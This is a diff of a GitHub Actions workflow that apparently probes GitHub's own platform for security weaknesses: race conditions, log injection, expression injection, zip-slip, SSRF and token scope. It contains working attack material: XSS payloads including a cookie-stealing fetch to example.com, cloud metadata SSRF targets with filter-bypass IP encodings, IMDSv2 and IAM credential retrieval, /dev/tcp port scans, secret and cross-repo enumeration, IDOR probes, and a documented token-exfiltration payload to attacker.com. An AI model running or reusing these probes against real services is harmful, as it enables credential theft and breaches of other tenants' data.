+            curl -sS -o "/tmp/race2_${i}.json" -w "%{http_code}" \
+              -X PUT "${AUTH[@]}" \
+              -H "Content-Type: application/json" \
+              "${API}/repos/${REPO}/contents/test-race-${i}.txt" \
+              -d "{\"message\":\"race test\",\"content\":\"dGVzdA==\"}" &
+          done
+          wait
+
+          RACE2_RESULTS=""
+          for i in $(seq 1 5); do
+            S=$(cat "/tmp/race2_${i}.json" 2>/dev/null | tail -c 3)
+            RACE2_RESULTS+="$S "
+          done
+          echo "  concurrent_write_statuses: $RACE2_RESULTS" >> race_results.txt
+
+          # ---------------------------------------------------------------
+          # Race 3: Read during state change
+          # Can we read data that's being modified concurrently?
+          # Example: list workflow runs while one completes
+          # ---------------------------------------------------------------
+          echo "" >> race_results.txt
+          echo "=== Race 3: Consistency during state transitions ===" >> race_results.txt
+
+          # Rapid sequential reads to detect inconsistency
+          for i in $(seq 1 20); do
+            curl -sS -o "/tmp/race3_${i}.json" \
+              "${AUTH[@]}" \
+              "${API}/repos/${REPO}/actions/runs?per_page=1&status=in_progress" &
+          done
+          wait
+
+          UNIQUE_RESPONSES=$(md5sum /tmp/race3_*.json 2>/dev/null | awk '{print $1}' | sort -u | wc -l)
+          echo "  20 concurrent reads: $UNIQUE_RESPONSES unique responses" >> race_results.txt
+          if [[ $UNIQUE_RESPONSES -gt 1 ]]; then
+            echo "  ⚠️  Inconsistent responses during concurrent reads" >> race_results.txt
+          else
+            echo "  ✅ Consistent responses" >> race_results.txt
+          fi
+
+          cat race_results.txt
+
+      - name: Upload race condition results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16d-race-conditions
+          path: race_results.txt
+
+  # ===================================================================
+  # 16E — Actions Log Injection (Stored XSS / UI Spoofing)
+  # ===================================================================
+  log_injection:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16E: Log injection attack vectors"
+        run: |
+          echo "=== 16E: Actions Log Injection ===" > log_injection.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> log_injection.txt
+
+          # ---------------------------------------------------------------
+          # The logs of GitHub Actions are rendered in the browser.
+          # If the rendering doesn't sanitize properly, we can inject:
+          # 1. HTML/JavaScript (stored XSS)
+          # 2. ANSI escape codes (terminal injection / CI masking)
+          # 3. Unicode RTL override (visual spoofing)
+          # 4. Workflow annotations (::error::, ::warning::)
+          #
+          # Impact: If XSS works, read cookies/tokens from GitHub.com
+          # domain for anyone viewing the log.
+          # ---------------------------------------------------------------
+
+          echo "--- HTML injection test payloads ---"
+          echo '<img src=x onerror=alert(document.domain)>'
+          echo '<script>fetch("https://example.com/?c="+document.cookie)</script>'
+          echo '<a href="javascript:alert(1)">Click here</a>'
+          echo '<svg onload=alert(1)>'
+          echo '<iframe src="https://example.com"></iframe>'
+          echo '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)-->'
+
+          echo ""
+          echo "--- ANSI escape injection ---"
+          # These could mask malicious output or confuse log viewers
+          printf '\033[2J\033[H'                    # Clear screen
+          printf '\033[31mFAKE ERROR: Token leaked\033[0m\n'  # Red text
+          printf '\033[8mHIDDEN TEXT: secret123\033[0m\n'     # Hidden text
+          printf '\033]8;;https://evil.com\033\\Click for details\033]8;;\033\\\n'  # Hyperlink
+
+          echo ""
+          echo "--- Unicode control character injection ---"
+          # RTL Override — makes text appear reversed, can mask file paths
+          printf 'Status: \xe2\x80\xaeliaf\xe2\x80\xac (appears as "fail" reversed)\n'
+          # Zero-width characters
+          printf 'normal\xe2\x80\x8btext\xe2\x80\x8bwith\xe2\x80\x8bzwsp\n'
+          # Homoglyph attack
+          printf 'Token: ghp_AAAA (using Cyrillic А instead of Latin A)\n'
+
+          echo ""
+          echo "--- Workflow annotation injection ---"
+          # These create UI elements in the Actions interface
+          echo "::error file=app.js,line=1,col=5::SQL injection found in production!"
+          echo "::error::CRITICAL: Repository compromised — this is a test"
+          echo "::warning::Secrets may have been exposed — v16e test"
+          echo "::notice::Security audit complete — v16e test"
+
+          # Multi-line annotation
+          echo "::group::🔴 CRITICAL SECURITY ALERT (v16e test)"
+          echo "This is a test of grouped log output"
+          echo "A real attacker could make this look very convincing"
+          echo "::endgroup::"
+
+          # Add commands — can we set outputs/env from log output?
+          echo "::set-output name=v16e_test::injected_via_log"
+          echo "::add-mask::ThisShouldBeMasked"
+          echo "::stop-commands::pause_token_12345"
+          echo "This text should NOT be processed as a command"
+          echo "::pause_token_12345::"
+
+          echo "" >> log_injection.txt
+          echo "All injection payloads written to log." >> log_injection.txt
+          echo "Check the Actions UI to see which ones render unsafely." >> log_injection.txt
+          echo "Specifically check:" >> log_injection.txt
+          echo "1. Does any HTML render as actual HTML elements?" >> log_injection.txt
+          echo "2. Do ANSI codes affect the log display?" >> log_injection.txt
+          echo "3. Do Unicode controls cause visual confusion?" >> log_injection.txt
+          echo "4. Do annotations create false security alerts?" >> log_injection.txt
+          echo "5. Does ::set-output:: actually set a step output?" >> log_injection.txt
+
+      - name: "16E-verify: Check if log commands were processed"
+        run: |
+          echo "=== 16E Verification ===" > log_verify.txt
+          echo "set-output value: '${{ steps.*.outputs.v16e_test }}'" >> log_verify.txt
+          echo "If this shows 'injected_via_log', the deprecated command still works" >> log_verify.txt
+          cat log_verify.txt
+
+      - name: Upload log injection analysis
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16e-log-injection
+          path: |
+            log_injection.txt
+            log_verify.txt
+
+  # ===================================================================
+  # 16F — Expression Engine Stress & Injection
+  # ===================================================================
+  expression_engine:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16F: Expression engine edge cases"
+        env:
+          # We test if workflow_dispatch inputs get evaluated recursively
+          USER_INPUT: ${{ github.event.inputs.expr_test_payload }}
+        run: |
+          echo "=== 16F: Expression Engine Analysis ===" > expr_results.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> expr_results.txt
+
+          echo "" >> expr_results.txt
+          echo "=== Input Reflection Test ===" >> expr_results.txt
+          echo "raw_input=$USER_INPUT" >> expr_results.txt
+
+          # If the input contained ${{ secrets.GITHUB_TOKEN }} and GitHub
+          # evaluated it recursively, the token would appear here
+          if [[ "$USER_INPUT" == *"ghp_"* || "$USER_INPUT" == *"ghs_"* ]]; then
+            echo "🔴 FINDING: Expression injection — input was evaluated!" >> expr_results.txt
+          else
+            echo "✅ Input was treated as literal string" >> expr_results.txt
+          fi
+
+          # ---------------------------------------------------------------
+          # Test what contexts are available in expressions
+          # ---------------------------------------------------------------
+          echo "" >> expr_results.txt
+          echo "=== Available Expression Contexts ===" >> expr_results.txt
+          echo "github.token length: ${#GITHUB_TOKEN}" >> expr_results.txt
+          echo "github.repository: ${{ github.repository }}" >> expr_results.txt
+          echo "github.sha: ${{ github.sha }}" >> expr_results.txt
+          echo "github.run_id: ${{ github.run_id }}" >> expr_results.txt
+          echo "runner.os: ${{ runner.os }}" >> expr_results.txt
+          echo "runner.arch: ${{ runner.arch }}" >> expr_results.txt
+          echo "runner.temp: ${{ runner.temp }}" >> expr_results.txt
+
+          # Test toJSON — can we dump entire context objects?
+          echo "" >> expr_results.txt
+          echo "=== Full github context (via toJSON) ===" >> expr_results.txt
+          echo '${{ toJSON(github) }}' >> expr_results.txt
+
+          # Check for interesting fields in the context
+          echo "" >> expr_results.txt
+          echo "=== Full runner context ===" >> expr_results.txt
+          echo '${{ toJSON(runner) }}' >> expr_results.txt
+
+          # Secrets context — should be masked
+          echo "" >> expr_results.txt
+          echo "=== Secrets context structure ===" >> expr_results.txt
+          echo '${{ toJSON(secrets) }}' >> expr_results.txt
+
+          cat expr_results.txt
+
+      - name: Upload expression results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16f-expression-engine
+          path: expr_results.txt
+
+  # ===================================================================
+  # 16G — Artifact Zip Slip Path Traversal
+  # ===================================================================
+  zipslip_test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16G: Create malicious artifact with path traversal"
+        run: |
+          echo "=== 16G: Artifact Zip Slip ===" > zipslip_analysis.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> zipslip_analysis.txt
+
+          # ---------------------------------------------------------------
+          # actions/upload-artifact uses a specific upload protocol.
+          # We test if it sanitizes filenames that contain ../ traversal.
+          #
+          # Approach: create files with traversal names and see what
+          # upload-artifact does.
+          # ---------------------------------------------------------------
+          mkdir -p /tmp/zipslip-test/normal
+          echo "normal content" > /tmp/zipslip-test/normal/safe.txt
+
+          # Test: can we include a path with ../ ?
+          mkdir -p /tmp/zipslip-test/subdir
+          echo "canary-traversal-v16g" > /tmp/zipslip-test/subdir/payload.txt
+
+          # Create a symlink that points outside
+          ln -sf /etc/hostname /tmp/zipslip-test/normal/hostname-link 2>/dev/null || true
+          ln -sf ../../../etc/passwd /tmp/zipslip-test/normal/passwd-link 2>/dev/null || true
+
+          echo "" >> zipslip_analysis.txt
+          echo "=== Files prepared for upload ===" >> zipslip_analysis.txt
+          find /tmp/zipslip-test -type f -o -type l | while read f; do
+            if [[ -L "$f" ]]; then
+              echo "  SYMLINK: $f -> $(readlink "$f")" >> zipslip_analysis.txt
+            else
+              echo "  FILE: $f ($(wc -c < "$f")b)" >> zipslip_analysis.txt
+            fi
+          done
+
+          # The real test is on the DOWNLOAD side:
+          # Does download-artifact extract symlinks? Does it follow them?
+          echo "" >> zipslip_analysis.txt
+          echo "=== Zip Slip Analysis ===" >> zipslip_analysis.txt
+          echo "Upload will test if actions/upload-artifact:" >> zipslip_analysis.txt
+          echo "  1. Follows symlinks during upload (leak /etc/hostname)" >> zipslip_analysis.txt
+          echo "  2. Preserves symlink targets (can't test yet)" >> zipslip_analysis.txt
+          echo "  3. Allows path traversal in artifact names" >> zipslip_analysis.txt
+
+          cat zipslip_analysis.txt
+
+      - name: Upload artifact with traversal test
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16g-zipslip
+          path: |
+            /tmp/zipslip-test/
+            zipslip_analysis.txt
+        continue-on-error: true
+
+      - name: "16G: Check what was actually uploaded"
+        run: |
+          echo "=== Post-upload analysis ===" >> zipslip_analysis.txt
+          echo "Check the artifact 'vector16g-zipslip' contents:" >> zipslip_analysis.txt
+          echo "  1. Was hostname-link content uploaded (symlink followed)?" >> zipslip_analysis.txt
+          echo "  2. Was passwd-link content uploaded?" >> zipslip_analysis.txt
+          echo "  If symlink targets were included = DATA LEAK finding" >> zipslip_analysis.txt
+
+          cat zipslip_analysis.txt
+
+      - name: Re-upload analysis
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16g-zipslip-analysis
+          path: zipslip_analysis.txt
+
+  # ===================================================================
+  # 16H — Service Container Network Probing & SSRF
+  # ===================================================================
+  network_probe:
+    runs-on: ubuntu-latest
+    services:
+      # A redis service container shares the Docker network
+      redis:
+        image: redis:7-alpine
+        ports:
+          - 6379:6379
+    steps:
+      - name: "16H: Network topology & SSRF from service container context"
+        run: |
+          echo "=== 16H: Service Container Network Probing ===" > network_probe.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> network_probe.txt
+
+          # ---------------------------------------------------------------
+          # Service containers run on the same Docker network.
+          # We probe the network to understand the topology and check
+          # if we can reach internal endpoints.
+          # ---------------------------------------------------------------
+
+          echo "" >> network_probe.txt
+          echo "=== Network Interfaces ===" >> network_probe.txt
+          ip addr 2>/dev/null >> network_probe.txt || ifconfig >> network_probe.txt 2>/dev/null || true
+
+          echo "" >> network_probe.txt
+          echo "=== Default Gateway & Routes ===" >> network_probe.txt
+          ip route 2>/dev/null >> network_probe.txt || netstat -rn >> network_probe.txt 2>/dev/null || true
+
+          echo "" >> network_probe.txt
+          echo "=== DNS Configuration ===" >> network_probe.txt
+          cat /etc/resolv.conf >> network_probe.txt 2>/dev/null || true
+
+          echo "" >> network_probe.txt
+          echo "=== Service Container Connectivity ===" >> network_probe.txt
+          # Can we reach the redis service? (should work — it's a declared service)
+          redis-cli -h redis ping >> network_probe.txt 2>/dev/null || \
+            redis-cli -h 127.0.0.1 ping >> network_probe.txt 2>/dev/null || \
+            echo "redis: not reachable" >> network_probe.txt
+
+          # ---------------------------------------------------------------
+          # SSRF probes (read-only, no data exfiltration)
+          # ---------------------------------------------------------------
+          echo "" >> network_probe.txt
+          echo "=== Cloud Metadata SSRF Probes ===" >> network_probe.txt
+
+          SSRF_TARGETS=(
+            # AWS metadata
+            "http://169.254.169.254/latest/meta-data/"
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            "http://169.254.169.254/latest/dynamic/instance-identity/document"
+            # AWS IMDSv2 — needs PUT for token first
+            "http://169.254.169.254/latest/api/token"
+            # GCP metadata
+            "http://metadata.google.internal/computeMetadata/v1/instance/"
+            "http://metadata.google.internal/computeMetadata/v1/project/"
+            # Azure metadata
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+            # IP variants to bypass naive filters
+            "http://[::ffff:169.254.169.254]/latest/"
+            "http://0xA9FEA9FE/latest/"
+            "http://2852039166/latest/"
+            "http://0251.0376.0251.0376/latest/"
+            # Docker internal
+            "http://172.17.0.1:2375/info"
+            "http://172.17.0.1:2376/info"
+            "http://host.docker.internal:2375/info"
+            # GitHub internal (speculative)
+            "http://github.localhost/"
+            "http://api.github.localhost/"
+          )
+
+          for target in "${SSRF_TARGETS[@]}"; do
+            RESP=$(curl -sS -o /tmp/ssrf_resp.txt -w "%{http_code}" \
+              --connect-timeout 3 --max-time 5 \
+              -H "Metadata-Flavor: Google" \
+              -H "Metadata: true" \
+              "$target" 2>/dev/null || echo "timeout")
+            BODY_SIZE=$(wc -c < /tmp/ssrf_resp.txt 2>/dev/null || echo "0")
+            echo "  $target → $RESP (${BODY_SIZE}b)" >> network_probe.txt
+            if [[ "$RESP" == "200" ]]; then
+              BODY_PREVIEW=$(head -c 200 /tmp/ssrf_resp.txt | tr '\n' ' ')
+              echo "    🔴 ACCESSIBLE: $BODY_PREVIEW" >> network_probe.txt
             fi
           done
 
           # ---------------------------------------------------------------
-          # IDOR TEST: Try to access a different run_id's artifacts
-          # If successful, this is CRITICAL — we can read any run's data
+          # AWS IMDSv2 attempt (requires token via PUT)
           # ---------------------------------------------------------------
-          echo "" >> runtime_api_probe.txt
-          echo "=== IDOR Test: Cross-Run Artifact Access ===" >> runtime_api_probe.txt
-          CURRENT_RUN="${{ github.run_id }}"
-          # Try run_id - 1 (previous run)
-          PREV_RUN=$((CURRENT_RUN - 1))
-          for test_run in "$PREV_RUN" "1" "$((CURRENT_RUN + 1))"; do
-            IDOR_RESP=$(curl -sS -o /tmp/idor.json -w "%{http_code}" \
-              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-              -H "Accept: application/json" \
-              "${RUNTIME_URL}_apis/pipelines/runs/${test_run}/artifacts" 2>/dev/null || echo "error")
-            IDOR_BODY=$(head -c 300 /tmp/idor.json 2>/dev/null | tr '\n' ' ')
-            echo "  run_id=$test_run → HTTP $IDOR_RESP" >> runtime_api_probe.txt
-            if [[ "$IDOR_RESP" == "200" ]]; then
-              echo "    🔴 FINDING: IDOR — accessed artifacts from run $test_run!" >> runtime_api_probe.txt
-              echo "    Response: $IDOR_BODY" >> runtime_api_probe.txt
-            else
-              echo "    Blocked (expected)" >> runtime_api_probe.txt
+          echo "" >> network_probe.txt
+          echo "=== IMDSv2 Token Attempt ===" >> network_probe.txt
+          IMDS_TOKEN=$(curl -sS -X PUT --connect-timeout 3 --max-time 5 \
+            -H "X-aws-ec2-metadata-token-ttl-seconds: 60" \
+            "http://169.254.169.254/latest/api/token" 2>/dev/null || echo "")
+          if [[ -n "$IMDS_TOKEN" && "$IMDS_TOKEN" != *"timeout"* ]]; then
+            echo "  🔴 FINDING: Got IMDSv2 token (${#IMDS_TOKEN} chars)" >> network_probe.txt
+            # Use token to get instance metadata
+            IMDS_DATA=$(curl -sS --connect-timeout 3 --max-time 5 \
+              -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
+              "http://169.254.169.254/latest/meta-data/" 2>/dev/null || echo "")
+            echo "  metadata: $(echo "$IMDS_DATA" | head -c 300)" >> network_probe.txt
+
+            # IAM credentials would be the crown jewel
+            IMDS_CREDS=$(curl -sS --connect-timeout 3 --max-time 5 \
+              -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
+              "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null || echo "")
+            echo "  iam_roles: $(echo "$IMDS_CREDS" | head -c 200)" >> network_probe.txt
+          else
+            echo "  IMDSv2: not reachable (expected in non-AWS)" >> network_probe.txt
+          fi
+
+          # ---------------------------------------------------------------
+          # Docker socket from service container network
+          # ---------------------------------------------------------------
+          echo "" >> network_probe.txt
+          echo "=== Docker API Probe ===" >> network_probe.txt
+          if [[ -S "/var/run/docker.sock" ]]; then
+            echo "  🔴 FINDING: Docker socket mounted in runner!" >> network_probe.txt
+            curl -sS --unix-socket /var/run/docker.sock \
+              http://localhost/containers/json 2>/dev/null | \
+              jq -r '.[].Names[0] // empty' >> network_probe.txt 2>/dev/null || true
+          else
+            echo "  Docker socket: not mounted (expected)" >> network_probe.txt
+          fi
+
+          # ---------------------------------------------------------------
+          # Port scan of local network for unexpected services
+          # ---------------------------------------------------------------
+          echo "" >> network_probe.txt
+          echo "=== Local Port Scan (runner host) ===" >> network_probe.txt
+          for port in 80 443 8080 8443 3000 5000 9090 2375 2376 6379 5432 3306 27017; do
+            (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && \
+              echo "  127.0.0.1:$port → OPEN" >> network_probe.txt || true
+          done
+
+          # Scan Docker bridge gateway
+          GATEWAY=$(ip route | awk '/default/ {print $3}' 2>/dev/null)
+          if [[ -n "$GATEWAY" ]]; then
+            echo "  gateway: $GATEWAY" >> network_probe.txt
+            for port in 80 443 2375 2376 8080 9090; do
+              (echo >/dev/tcp/$GATEWAY/$port) 2>/dev/null && \
+                echo "  ${GATEWAY}:$port → OPEN" >> network_probe.txt || true
+            done
+          fi
+
+          cat network_probe.txt
+
+      - name: Upload network probe
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16h-network-probe
+          path: network_probe.txt
+
+  # ===================================================================
+  # 16I — GITHUB_TOKEN vs Fine-Grained PAT Endpoint Differential
+  # ===================================================================
+  token_differential:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16I: Token type differential analysis"
+        run: |
+          echo "=== 16I: Token Type Differential ===" > token_diff.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> token_diff.txt
+
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          REPO="${{ github.repository }}"
+          OWNER="${{ github.repository_owner }}"
+          API="https://api.github.com"
+
+          # ---------------------------------------------------------------
+          # GITHUB_TOKEN is actually a GitHub App installation token.
+          # It has a different internal type than PATs. Some endpoints may
+          # respond differently based on token type, potentially leaking
+          # data or allowing operations that should be restricted.
+          # ---------------------------------------------------------------
+
+          echo "" >> token_diff.txt
+          echo "=== Token Type Detection ===" >> token_diff.txt
+
+          # Rate limit response reveals token type via headers
+          RATE_HEADERS=$(curl -sS -I \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "${API}/rate_limit" 2>/dev/null)
+
+          echo "$RATE_HEADERS" | grep -iE "x-oauth-scopes|x-ratelimit|x-github" >> token_diff.txt || true
+
+          echo "" >> token_diff.txt
+          echo "=== Endpoint Response Differential ===" >> token_diff.txt
+
+          # Test endpoints that might behave differently for App tokens vs PATs
+          DIFF_ENDPOINTS=(
+            # App-specific endpoints
+            "/installation/repositories"
+            "/app"
+            "/app/installations"
+            # User endpoints (should fail for App tokens)
+            "/user"
+            "/user/repos"
+            "/user/emails"
+            "/user/keys"
+            # Org endpoints
+            "/orgs/${OWNER}"
+            "/orgs/${OWNER}/members"
+            "/orgs/${OWNER}/teams"
+            "/orgs/${OWNER}/hooks"
+            # Repo endpoints with escalation potential
+            "/repos/${REPO}/hooks"
+            "/repos/${REPO}/keys"
+            "/repos/${REPO}/environments"
+            "/repos/${REPO}/actions/secrets"
+            "/repos/${REPO}/actions/organization-secrets"
+            "/repos/${REPO}/vulnerability-alerts"
+            # Meta endpoints
+            "/meta"
+            "/octocat"
+          )
+
+          for ep in "${DIFF_ENDPOINTS[@]}"; do
+            STATUS=$(curl -sS -o /tmp/diff_resp.json -w "%{http_code}" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "${API}${ep}" 2>/dev/null || echo "000")
+            BODY_SIZE=$(wc -c < /tmp/diff_resp.json 2>/dev/null || echo "0")
+            echo "  $ep → $STATUS (${BODY_SIZE}b)" >> token_diff.txt
+
+            # Flag any endpoint that returns data when it shouldn't
+            if [[ "$STATUS" == "200" ]]; then
+              PREVIEW=$(head -c 100 /tmp/diff_resp.json 2>/dev/null | tr '\n' ' ')
+              echo "    data: $PREVIEW" >> token_diff.txt
             fi
           done
 
-          cat runtime_api_probe.txt
+          # ---------------------------------------------------------------
+          # Test: Does GITHUB_TOKEN have implicit scopes not in permissions: ?
+          # ---------------------------------------------------------------
+          echo "" >> token_diff.txt
+          echo "=== Implicit Scope Detection ===" >> token_diff.txt
 
-      - name: Upload runtime API probe
-        uses: actions/upload-artifact@v4
-        with:
-          name: vector15a-runtime-api-probe
-          path: runtime_api_probe.txt
-
-  # =====================================================================
-  # 15B — Cache API Cross-Scope Access
-  # =====================================================================
-  cache_api_probe:
-    runs-on: ubuntu-latest
-    needs: jwt_analysis
-    steps:
-      - name: Probe Cache API for cross-scope access
-        run: |
-          echo "=== 15B: Cache API Cross-Scope Probe ===" > cache_api_probe.txt
-          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> cache_api_probe.txt
-
-          CACHE_URL="${ACTIONS_CACHE_URL:-}"
-          RUNTIME_TOKEN="${ACTIONS_RUNTIME_TOKEN:-}"
-
-          if [[ -z "$CACHE_URL" ]]; then
-            echo "ERROR: ACTIONS_CACHE_URL not available" >> cache_api_probe.txt
-            cat cache_api_probe.txt
-            exit 0
+          # Try to read actions secrets LIST (not values — should need secrets: read)
+          SECRETS_RESP=$(curl -sS -o /tmp/secrets.json -w "%{http_code}" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "${API}/repos/${REPO}/actions/secrets" 2>/dev/null)
+          echo "  actions/secrets (need secrets:read): $SECRETS_RESP" >> token_diff.txt
+          if [[ "$SECRETS_RESP" == "200" ]]; then
+            SECRET_COUNT=$(jq -r '.total_count // 0' /tmp/secrets.json 2>/dev/null)
+            echo "    🔴 FINDING: Can list secrets ($SECRET_COUNT) without secrets:read!" >> token_diff.txt
+            jq -r '.secrets[].name' /tmp/secrets.json 2>/dev/null >> token_diff.txt || true
           fi
 
-          echo "cache_url=$CACHE_URL" >> cache_api_probe.txt
+          # Try to read variables (need variables: read — not declared)
+          VARS_RESP=$(curl -sS -o /tmp/vars.json -w "%{http_code}" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "${API}/repos/${REPO}/actions/variables" 2>/dev/null)
+          echo "  actions/variables (need variables:read): $VARS_RESP" >> token_diff.txt
+          if [[ "$VARS_RESP" == "200" ]]; then
+            echo "    ⚠️  Can list variables without variables:read" >> token_diff.txt
+          fi
+
+          # Try Dependabot
+          DEPBOT_RESP=$(curl -sS -o /dev/null -w "%{http_code}" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "${API}/repos/${REPO}/dependabot/secrets" 2>/dev/null)
+          echo "  dependabot/secrets: $DEPBOT_RESP" >> token_diff.txt
+
+          # Try to access other repos in the org
+          echo "" >> token_diff.txt
+          echo "=== Cross-Repo Access Test ===" >> token_diff.txt
+          ORG_REPOS=$(curl -sS \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "${API}/orgs/${OWNER}/repos?per_page=10&type=all" 2>/dev/null \
+            | jq -r '.[].full_name' 2>/dev/null || echo "LIST_FAILED")
+          echo "  accessible_repos:" >> token_diff.txt
+          echo "$ORG_REPOS" | head -20 >> token_diff.txt
+
+          # Can we read files from a DIFFERENT repo using this token?
+          while IFS= read -r other_repo; do
+            [[ "$other_repo" == "$REPO" || -z "$other_repo" ]] && continue
+            CROSS_RESP=$(curl -sS -o /dev/null -w "%{http_code}" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "${API}/repos/${other_repo}/contents/README.md" 2>/dev/null)
+            echo "  $other_repo/README.md: $CROSS_RESP" >> token_diff.txt
+            if [[ "$CROSS_RESP" == "200" ]]; then
+              echo "    ⚠️  Cross-repo read succeeded with repo-scoped token" >> token_diff.txt
+            fi
+          done <<< "$ORG_REPOS"
+
+          cat token_diff.txt
+
+      - name: Upload token differential
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16i-token-differential
+          path: token_diff.txt
+
+  # ===================================================================
+  # 16J — Workflow Dispatch Input → Expression Injection
+  # ===================================================================
+  input_injection:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16J: Input expression injection analysis"
+        env:
+          USER_INPUT: ${{ github.event.inputs.expr_test_payload }}
+        run: |
+          echo "=== 16J: Workflow Dispatch Input Injection ===" > input_injection.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> input_injection.txt
 
           # ---------------------------------------------------------------
-          # Try to list/query caches using common key patterns
-          # Cache keys from other workflows would indicate scope leak
+          # github.event.inputs.* values come from workflow_dispatch.
+          # If these are interpolated unsafely in run: blocks, they
+          # enable arbitrary command injection. More subtly, if they're
+          # used in ${{ }} expressions elsewhere (if: conditions, with:
+          # parameters), they might enable expression injection.
+          #
+          # This test checks what happens when the input contains
+          # expression syntax, shell metacharacters, and GitHub-specific
+          # injection patterns.
           # ---------------------------------------------------------------
-          CACHE_KEYS=(
-            "Linux-npm-"
-            "Linux-pip-"
-            "Linux-go-"
-            "node-modules-"
-            "v1-dependencies-"
-            "composer-"
-            "gradle-"
-            "maven-"
-            "*"  # Wildcard — does the API support listing ALL caches?
-          )
 
-          echo "" >> cache_api_probe.txt
-          echo "=== Cache Key Query Results ===" >> cache_api_probe.txt
-          for key in "${CACHE_KEYS[@]}"; do
-            # Cache lookup endpoint: GET _apis/artifactcache/cache?keys=KEY&version=VERSION
-            CACHE_RESP=$(curl -sS -o /tmp/cache_resp.json -w "%{http_code}" \
-              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-              -H "Accept: application/json;api-version=6.0-preview.1" \
-              "${CACHE_URL}_apis/artifactcache/cache?keys=${key}&version=1" \
-              2>/dev/null || echo "error")
-            CACHE_BODY=$(head -c 500 /tmp/cache_resp.json 2>/dev/null | tr '\n' ' ')
+          # The input is passed via env: to prevent direct injection
+          # (this is the SAFE pattern). But many workflows do this:
+          #   run: echo "${{ github.event.inputs.name }}"
+          # which is VULN to injection.
 
-            echo "  key='$key' → HTTP $CACHE_RESP" >> cache_api_probe.txt
-            if [[ "$CACHE_RESP" == "200" ]]; then
-              CACHE_HIT=$(echo "$CACHE_BODY" | python3 -c "
-              import sys, json
-              try:
-                  d = json.load(sys.stdin)
-                  if d.get('archiveLocation'):
-                      print(f'CACHE_HIT: key={d.get(\"cacheKey\",\"?\")} scope={d.get(\"scope\",\"?\")} size={d.get(\"cacheSize\",\"?\")}')
-                  else:
-                      print('CACHE_MISS (no archiveLocation)')
-              except: print('PARSE_ERROR')
-              " 2>/dev/null || echo "PARSE_ERROR")
-                            echo "    $CACHE_HIT" >> cache_api_probe.txt
-                            if echo "$CACHE_HIT" | grep -q "CACHE_HIT"; then
-                              echo "    📦 Found cache entry — checking scope..." >> cache_api_probe.txt
-                              # Save for analysis
-                              cp /tmp/cache_resp.json "$RUNNER_TEMP/cache_hit_$(echo "$key" | tr '/*' '_').json" 2>/dev/null || true
-                            fi
-                          fi
-                        done
+          INPUT_VAL="$USER_INPUT"
+          echo "raw_expression_result: $INPUT_VAL" >> input_injection.txt
 
-                        # ---------------------------------------------------------------
-                        # List ALL caches via REST API (separate from internal API)
-                        # ---------------------------------------------------------------
-                        echo "" >> cache_api_probe.txt
-                        echo "=== REST API Cache List (public API) ===" >> cache_api_probe.txt
-                        GITHUB_CACHES=$(curl -sS \
-                          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-                          -H "Accept: application/vnd.github+json" \
-                          "https://api.github.com/repos/${{ github.repository }}/actions/caches?per_page=5" \
-                          2>/dev/null || echo "{}")
-                        echo "$GITHUB_CACHES" | python3 -c "
-              import sys, json
-              try:
-                  d = json.load(sys.stdin)
-                  total = d.get('total_count', 0)
-                  print(f'total_caches={total}')
-                  for c in d.get('actions_caches', []):
-                      print(f'  cache: key={c.get(\"key\",\"?\")} ref={c.get(\"ref\",\"?\")} size={c.get(\"size_in_bytes\",0)/1024:.1f}KB')
-              except: print('API_ERROR')
-              " >> cache_api_probe.txt 2>/dev/null || true
+          # Document what injection payloads were sent
+          echo "" >> input_injection.txt
+          echo "=== Injection Payload Analysis ===" >> input_injection.txt
+          echo "The dispatch can be called with these payloads:" >> input_injection.txt
+          echo "" >> input_injection.txt
+          echo '1. Expression injection: ${{ secrets.GITHUB_TOKEN }}' >> input_injection.txt
+          echo '   If token appears in output = CRITICAL' >> input_injection.txt
+          echo "" >> input_injection.txt
+          echo '2. Shell injection: ; curl https://attacker.com?t=$GITHUB_TOKEN' >> input_injection.txt
+          echo '   If used unsafely in run: block' >> input_injection.txt
+          echo "" >> input_injection.txt
+          echo '3. Env manipulation: value' >> input_injection.txt
+          echo '   GITHUB_TOKEN=leaked' >> input_injection.txt
+          echo '   If GITHUB_ENV is writable' >> input_injection.txt
